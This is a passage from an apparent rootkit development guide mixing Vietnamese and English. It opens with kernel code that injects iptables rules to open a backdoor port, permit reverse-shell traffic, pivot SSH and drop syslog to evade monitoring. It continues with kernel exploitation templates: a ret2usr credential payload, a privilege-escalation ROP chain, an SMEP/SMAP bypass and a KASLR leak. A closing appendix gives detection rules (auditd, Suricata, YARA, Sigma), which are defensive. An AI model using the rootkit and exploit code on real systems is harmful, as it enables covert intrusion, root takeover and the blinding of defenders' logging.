/* iptables_inject.c — Inject firewall rules từ kernel space
 *
 * Programmatically add iptables rules để:
 *   - Mở port backdoor
 *   - Forward traffic
 *   - Drop forensics traffic (tới SIEM, log server)
 *   - Redirect DNS (cho DNS hijacking)
 */

#include "rootkit.h"
#include <linux/kmod.h>

static void rk_inject_iptables(void)
{
    char *cmd =
        /* Allow inbound trên backdoor port */
        "iptables -I INPUT -p tcp --dport 31337 -j ACCEPT 2>/dev/null; "
        /* Allow outbound cho reverse shell */
        "iptables -I OUTPUT -p tcp --dport 4444 -j ACCEPT 2>/dev/null; "
        /* Port forward: external:8080 → internal:22 (SSH pivot) */
        "iptables -t nat -A PREROUTING -p tcp --dport 8080 "
        "-j DNAT --to-destination 10.0.0.5:22 2>/dev/null; "
        "iptables -t nat -A POSTROUTING -j MASQUERADE 2>/dev/null; "
        "echo 1 > /proc/sys/net/ipv4/ip_forward; "
        /* Drop syslog traffic (prevent log forwarding tới SIEM) */
        "iptables -I OUTPUT -p udp --dport 514 -j DROP 2>/dev/null; "
        /* Ẩn rules: iptables-save sẽ thấy nhưng rootkit có thể
         * hook read() trên stdout của iptables-save process */
        "true";

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

static void rk_remove_iptables(void)
{
    char *cmd =
        "iptables -D INPUT -p tcp --dport 31337 -j ACCEPT 2>/dev/null; "
        "iptables -D OUTPUT -p tcp --dport 4444 -j ACCEPT 2>/dev/null; "
        "iptables -t nat -D PREROUTING -p tcp --dport 8080 "
        "-j DNAT --to-destination 10.0.0.5:22 2>/dev/null; "
        "iptables -D OUTPUT -p udp --dport 514 -j DROP 2>/dev/null; "
        "true";

    char *argv[] = { "/bin/sh", "-c", cmd, NULL };
    char *envp[] = { "PATH=/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}
```

---

## Appendix J: Exploitation Primitives

### J.1 Kernel ROP / ret2usr / SMEP Bypass {#kernel-rop}

```c
/* kernel_exploit_primitives.c — Kernel exploitation techniques
 *
 * MISSING coverage: Kernel ROP, ret2usr, SMEP/SMAP bypass.
 * Đây là các techniques dùng khi CHƯA CÓ kernel code execution
 * (chưa load được module) — cần exploit vulnerability trước.
 *
 * Context: rootkit cần load module, nhưng nếu không có root access,
 * phải exploit kernel vulnerability trước.
 *
 * NOTE: Đây là educational reference, không phải working exploits.
 * Mỗi vulnerability khác nhau cần gadgets khác nhau.
 */

/* ═══════════════════════════════════════════════════
 * 1. ret2usr (Return to Userspace)
 *
 * Kỹ thuật cũ nhất: redirect kernel execution tới userspace code.
 * Bị chặn bởi SMEP (Supervisor Mode Execution Prevention, CR4 bit 20)
 * và SMAP (Supervisor Mode Access Prevention, CR4 bit 21).
 *
 * Pre-SMEP flow (kernel < 3.0):
 *   1. Allocate userspace page chứa payload
 *   2. Overflow/corrupt function pointer trong kernel
 *   3. Kernel jumps tới userspace payload
 *   4. Payload chạy trong ring 0 context
 *
 * SMEP bypass: clear CR4 bit 20 trước khi ret2usr
 * ═══════════════════════════════════════════════════ */

/* Userspace payload — chạy trong ring 0 khi kernel calls nó */
void __attribute__((used)) userspace_payload(void)
{
    /* Đang trong kernel context (ring 0) dù code ở userspace.
     * Gọi commit_creds(prepare_kernel_cred(NULL)) cho root.
     *
     * Phải resolve addresses runtime (KASLR).
     * commit_creds_ptr và prepare_kernel_cred_ptr
     * resolved từ /proc/kallsyms hoặc info leak. */

    typedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *);
    typedef int (*commit_creds_t)(struct cred *);

    prepare_kernel_cred_t pkc =
        (void *)0xffffffff810a9d80;  /* Example — KASLR dependent */
    commit_creds_t cc =
        (void *)0xffffffff810a9b40;  /* Example — KASLR dependent */

    cc(pkc(NULL));
}

/* ═══════════════════════════════════════════════════
 * 2. ROP (Return-Oriented Programming)
 *
 * Kernel ROP: chain gadgets trong kernel text (.text section).
 * Mỗi gadget = snippet kết thúc bằng RET.
 * Chain gadgets trên stack → arbitrary code execution.
 *
 * Common gadgets (tìm bằng ROPgadget hoặc ropr):
 *   pop rdi; ret     → load arg1
 *   pop rsi; ret     → load arg2
 *   mov cr4, rdi; ret → disable SMEP
 *   xchg eax, esp; ret → stack pivot
 *
 * Typical ROP chain for privilege escalation:
 *   1. pop rdi; ret → NULL
 *   2. prepare_kernel_cred → returns new cred in RAX
 *   3. mov rdi, rax; ret → move cred to arg1
 *   4. commit_creds → apply root cred
 *   5. swapgs; iretq → return to userspace
 * ═══════════════════════════════════════════════════ */

struct rop_chain {
    unsigned long *chain;
    int            length;
    int            capacity;
};

/* Build ROP chain helper — adds gadget address to chain */
static void rop_push(struct rop_chain *rop, unsigned long gadget)
{
    if (rop->length < rop->capacity)
        rop->chain[rop->length++] = gadget;
}

/* Example: build privilege escalation ROP chain.
 * Gadget addresses from specific kernel build — NOT portable.
 * Must be resolved per-target via /proc/kallsyms or info leak.
 */
static void build_privesc_chain(struct rop_chain *rop,
                                  unsigned long kaslr_base)
{
    /* Offsets from kernel base — example values.
     * Find real offsets: ROPgadget --binary vmlinuz | grep "pop rdi" */
    unsigned long pop_rdi_ret     = kaslr_base + 0x001518;
    unsigned long prepare_kcred   = kaslr_base + 0x0a9d80;
    unsigned long mov_rdi_rax_ret = kaslr_base + 0x06238a;
    unsigned long commit_creds_fn = kaslr_base + 0x0a9b40;
    unsigned long swapgs_restore  = kaslr_base + 0xc00eaa;

    /* Chain: prepare_kernel_cred(NULL) */
    rop_push(rop, pop_rdi_ret);
    rop_push(rop, 0);                /* arg1 = NULL */
    rop_push(rop, prepare_kcred);

    /* Chain: commit_creds(result) */
    rop_push(rop, mov_rdi_rax_ret);  /* rdi = rax (cred) */
    rop_push(rop, commit_creds_fn);

    /* Chain: return to userspace cleanly */
    rop_push(rop, swapgs_restore);
    /* IRETQ frame: RIP, CS, RFLAGS, RSP, SS */
    rop_push(rop, (unsigned long)&userspace_return); /* RIP */
    rop_push(rop, 0x33);             /* User CS */
    rop_push(rop, saved_rflags);     /* RFLAGS */
    rop_push(rop, (unsigned long)user_stack); /* RSP */
    rop_push(rop, 0x2b);             /* User SS */
}

/* ═══════════════════════════════════════════════════
 * 3. SMEP/SMAP Bypass
 *
 * SMEP: CR4 bit 20 — prevents ring 0 executing user pages
 * SMAP: CR4 bit 21 — prevents ring 0 accessing user pages
 *
 * Bypass ROP gadget: mov cr4, rdi; ret
 * Set rdi = CR4 value with bits 20+21 cleared.
 *
 * Modern bypass (post-5.x): CR4 pinning makes this harder.
 * Kernel checks CR4 on context switch → re-enables SMEP/SMAP.
 * Must complete exploit before next context switch.
 * ═══════════════════════════════════════════════════ */

/* ROP gadget to disable SMEP/SMAP */
static void add_smep_bypass(struct rop_chain *rop,
                              unsigned long kaslr_base)
{
    unsigned long pop_rdi_ret    = kaslr_base + 0x001518;
    unsigned long mov_cr4_rdi   = kaslr_base + 0x06a4b0;

    /* Current CR4 with SMEP(20) and SMAP(21) cleared */
    unsigned long cr4_no_smep_smap = 0x6f0;  /* Example value */

    rop_push(rop, pop_rdi_ret);
    rop_push(rop, cr4_no_smep_smap);
    rop_push(rop, mov_cr4_rdi);
}

/* ═══════════════════════════════════════════════════
 * 4. Stack Pivot
 *
 * Khi overflow chỉ control limited bytes trên stack,
 * cần "pivot" RSP tới attacker-controlled buffer
 * chứa full ROP chain.
 *
 * Common gadget: xchg eax, esp; ret
 *   Swap lower 32 bits of RAX with ESP.
 *   RAX set via earlier gadget tới mmap'd address.
 * ═══════════════════════════════════════════════════ */

/* ═══════════════════════════════════════════════════
 * 5. KASLR Bypass
 *
 * KASLR randomizes kernel text base address mỗi boot.
 * Phải leak base address trước khi build ROP chain.
 *
 * Leak vectors:
 *   a) /proc/kallsyms (nếu kptr_restrict=0)
 *   b) dmesg (kernel pointers, nếu dmesg_restrict=0)
 *   c) Side-channel (prefetch, TSX, spectre variants)
 *   d) Info leak vulnerability (uninitialized stack/heap data)
 *   e) /sys/kernel/notes (ELF notes chứa build-id → offset calc)
 * ═══════════════════════════════════════════════════ */

static unsigned long leak_kaslr_base(void)
{
    FILE *f;
    char line[256];
    unsigned long addr;

    /* Method A: /proc/kallsyms (easiest, requires root or kptr_restrict=0) */
    f = fopen("/proc/kallsyms", "r");
    if (!f) return 0;

    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, " T _text") || strstr(line, " T startup_64")) {
            sscanf(line, "%lx", &addr);
            fclose(f);
            return addr;
        }
    }
    fclose(f);
    return 0;
}
```

---

## Appendix K: Detection Engineering Additions {#detection-additions}

```bash
# ═══════════════════════════════════════════════════════════════
# BỔ SUNG Detection Engineering — Chapter 16
# Cover mọi technique chưa có detection rule
# ═══════════════════════════════════════════════════════════════

# ── 1. VFS iterate_shared hook detection ──
# Check nếu /proc file_operations bị modified
# So sánh f_op pointer với expected kernel address
cat /proc/kallsyms | grep "proc_root_operations"
# Nếu runtime f_op khác static value → hooked

# ── 2. Inline hook detection ──
# Scan kernel text cho mov rax + jmp rax pattern tại function entry
# Pattern: 48 b8 XX XX XX XX XX XX XX XX ff e0
python3 -c "
import mmap, re
with open('/proc/kcore', 'rb') as f:
    mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
    # Tìm trampoline pattern
    pattern = b'\\x48\\xb8.{8}\\xff\\xe0'
    for m in re.finditer(pattern, mm):
        print(f'Inline hook at offset {hex(m.start())}')
" 2>/dev/null

# ── 3. IDT modification detection ──
# Compare IDT entries với expected values
python3 -c "
# Read IDTR và compare entries
# Volatility: vol3 -f dump.raw linux.check_idt
print('Use: vol3 linux.check_idt.CheckIDT')
"

# ── 4. MSR_LSTAR detection ──
# Check MSR_LSTAR points vào kernel text
rdmsr 0xC0000082 2>/dev/null || echo "Install msr-tools"
# Compare output với: grep entry_SYSCALL_64 /proc/kallsyms

# ── 5. LSM hook detection ──
# List registered LSM modules
cat /sys/kernel/security/lsm
# Check cho unexpected entries
# Compare security_hook_heads list count trước và sau

# ── 6. Port knock detection (Suricata rule) ──
cat > /etc/suricata/rules/rootkit.rules << 'SURICATA'
# Detect port knocking pattern: 3 SYN packets to unusual ports < 5s
alert tcp any any -> $HOME_NET any (msg:"Possible port knock sequence"; \
    flags:S; threshold:type threshold, track by_src, count 3, seconds 5; \
    sid:1000001; rev:1;)

# Detect ICMP tunnel (large/frequent ICMP payloads)
alert icmp any any -> $HOME_NET any (msg:"ICMP tunnel suspected"; \
    dsize:>100; threshold:type threshold, track by_src, count 10, seconds 60; \
    sid:1000002; rev:1;)

# Detect DNS tunnel (high-entropy subdomain queries)
alert dns any any -> any 53 (msg:"DNS tunnel suspected"; \
    dns.query; content:"."; offset:30; \
    sid:1000003; rev:1;)
SURICATA

# ── 7. Auditd rules cho rootkit detection ──
cat > /etc/audit/rules.d/rootkit.rules << 'AUDIT'
# Monitor module loading
-w /sbin/insmod -p x -k rootkit_module_load
-w /sbin/modprobe -p x -k rootkit_module_load
-a always,exit -F arch=b64 -S init_module -S finit_module -k module_load

# Monitor credential changes
-a always,exit -F arch=b64 -S setuid -S setgid -S setreuid -S setregid -k cred_change

# Monitor /etc/ld.so.preload (LD_PRELOAD rootkit)
-w /etc/ld.so.preload -p wa -k ld_preload

# Monitor /proc/sys writes (sysctl manipulation)
-w /proc/sys/ -p w -k sysctl_modify

# Monitor raw socket creation
-a always,exit -F arch=b64 -S socket -F a0=2 -F a1=3 -k raw_socket

# Monitor keylogger targets
-w /dev/input/ -p r -k input_device_access
AUDIT

# ── 8. Keylogger detection ──
# Check registered keyboard notifiers
cat /sys/kernel/debug/notifier/keyboard 2>/dev/null
# Check input handlers
ls -la /dev/input/
cat /proc/bus/input/handlers
# Unexpected handler = potential keylogger

# ── 9. Timestamp manipulation detection ──
# Find files with timestamps matching /bin/ls (timestomped indicator)
find / -newer /bin/ls -a ! -newer /bin/ls -maxdepth 3 2>/dev/null
# Files with EXACT same mtime as /bin/ls = suspicious

# ── 10. Container escape detection ──
# From inside container: check nếu namespace changed
ls -la /proc/1/ns/ 2>/dev/null
# Compare với expected container namespace IDs
# Mismatch = namespace escape

# ── 11. /dev/kmem custom device detection ──
ls -la /dev/ | grep -v "^[bcd]" | grep -v "^l"
# Unexpected character devices
cat /proc/devices | grep -i "misc"
# Check misc devices cho unexpected entries

# ── 12. YARA rules bổ sung ──
cat >> rootkit_detector.yar << 'YARA'

rule LD_Preload_Rootkit {
    meta:
        description = "Detect LD_PRELOAD-based userspace rootkit"
    strings:
        $s1 = "RTLD_NEXT" ascii
        $s2 = "readdir" ascii
        $s3 = "ld.so.preload" ascii
        $hide = "HIDDEN" ascii
    condition:
        uint32(0) == 0x464c457f and
        all of ($s*) and $hide
}

rule Kernel_Keylogger {
    meta:
        description = "Detect kernel keylogger module"
    strings:
        $s1 = "register_keyboard_notifier" ascii
        $s2 = "KBD_KEYSYM" ascii
        $s3 = "KEY_ENTER" ascii
        $log = "keylog" ascii nocase
    condition:
        uint32(0) == 0x464c457f and
        2 of ($s*) and $log
}

rule Encrypted_C2_Module {
    meta:
        description = "Detect kernel module with encrypted C2"
    strings:
        $s1 = "kernel_sendmsg" ascii
        $s2 = "kernel_recvmsg" ascii
        $s3 = "crypto_alloc_shash" ascii
        $s4 = "sock_create_kern" ascii
    condition:
        uint32(0) == 0x464c457f and
        3 of ($s*)
}
YARA

# ── 13. Sigma rule cho persistence methods ──
cat > persistence_detect.yml << 'SIGMA'
title: Rootkit Persistence via Udev Rule
status: experimental
logsource:
    product: linux
    category: file_create
detection:
    selection:
        TargetFilename|endswith: '.rules'
        TargetFilename|contains: '/etc/udev/rules.d/'
    filter:
        Image|endswith:
            - '/apt'
            - '/dpkg'
            - '/rpm'
    condition: selection and not filter
level: high

---

title: Rootkit Persistence via Initramfs Modification
status: experimental
logsource:
    product: linux
    category: process_creation
detection:
    selection:
        CommandLine|contains:
            - 'update-initramfs'
            - 'dracut --force'
    filter:
        ParentImage|endswith:
            - '/apt'
            - '/dpkg'
            - '/yum'
            - '/dnf'
    condition: selection and not filter
level: high

---

title: Suspicious Module Auto-Load Configuration
status: experimental
logsource:
    product: linux
    category: file_create
detection:
    selection:
        TargetFilename|contains:
            - '/etc/modules-load.d/'
            - '/etc/modprobe.d/'
    filter:
        Image|endswith:
            - '/apt'
            - '/dpkg'
    condition: selection and not filter
level: medium
SIGMA
```
